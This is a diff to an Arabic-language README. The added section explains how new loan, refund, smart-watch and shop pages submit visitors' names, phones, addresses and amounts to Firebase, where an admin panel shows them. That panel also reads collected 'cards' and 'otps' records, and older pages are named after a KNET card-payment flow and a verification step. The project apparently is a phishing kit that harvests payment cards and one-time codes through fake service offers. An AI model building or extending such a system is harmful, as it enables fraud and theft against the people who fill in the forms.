@@ -165,7 +165,39 @@ python3 serve.py
 
 **مهم:** عند تغيير أي مفتاح، حدّثه في `.env` (محلياً) وفي متغيّرات بيئة المنصة.
 عند تعديل `firebase-client.js` ارفع رقم `?v=` في وسوم `<script>` داخل الصفحات
-(الرقم الحالي `5`).
+(الرقم الحالي `6`).
+
+## ربط النماذج بقاعدة البيانات (إرسال الطلبات)
+
+**الخلفية:** الموقع يستخدم Firebase (Firestore + RTDB) — نفس مشروع اللوحة. الصفحات
+القديمة (`cartepage.html`, `knet.html`, `verification.html`) ترسل بياناتها عبر دوال
+`window.pushFirebase*` في `assets/js/firebase-client.js`، واللوحة (`admin/`) تقرأ من
+مجموعات `customers` / `cards` / `otps`.
+
+**المشكلة:** الصفحات الجديدة (`loan.html`, `refund.html`, `watch.html`, `shop.html`)
+لم تكن تُحمّل سكربتات Firebase أصلاً، فلم تكن أي طلب يصل لقاعدة البيانات.
+
+**الحل:**
+- `assets/js/firebase-client.js` → دالة جديدة `window.pushFirebaseRequest(request)`:
+  تكتب في `customers/{sessionId}` (الحقول الموحّدة: name/phone/address/amount +
+  `requestType`/`requestTypeLabel`/`refNo`/`details`) فتظهر مباشرة في جدول اللوحة،
+  وتكتب نسخة كاملة في مجموعة `requests/{refNo}` (أرشيف كل طلب بتفاصيله)، وتحدّث
+  جلسة RTDB للتوافق. `getFriendlyPageName()` صار يميّز الصفحات الجديدة.
+- `assets/js/request-store.js` (جديد) → `window.submitServiceRequest(req)`: ينتظر
+  `ensureAuthReady()` ثم يرسل، مع حدّ زمني 2500ms وحماية من الإرسال المزدوج، فلا
+  يتعطّل توجيه الصفحة إن تأخّرت الشبكة.
+- الصفحات (`loan/refund/watch/shop`) تُحمّل الآن سكربتات Firebase + الدالتين في
+  نهاية `<body>`، وتستدعي `submitServiceRequest({type, name, phone, address, amount,
+  details})` عند الإرسال قبل التوجيه إلى `wait1.html`.
+- `admin/assets/js/app.js` → يعرض `requestTypeLabel` كشارة في صف الجدول، ويفتح قسم
+  «تفاصيل الطلب» في نافذة المعلومات الشخصية (`requestDetailRows` حسب النوع)، ويشمل
+  رقم الطلب ونوعه في البحث.
+
+**أنواع الطلبات:** `loan` (سلفة) / `refund` (استرداد) / `watch` (ساعة ذكية).
+كل نوع له حقول `details` خاصة تُعرض في اللوحة.
+
+**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` في كل الصفحات (رُفع إلى `6`)،
+وعند تعديل `request-store.js` ارفع نسخته (حالياً `?v=1`).
 
 ## تدفق البيانات (Data Flow)
 
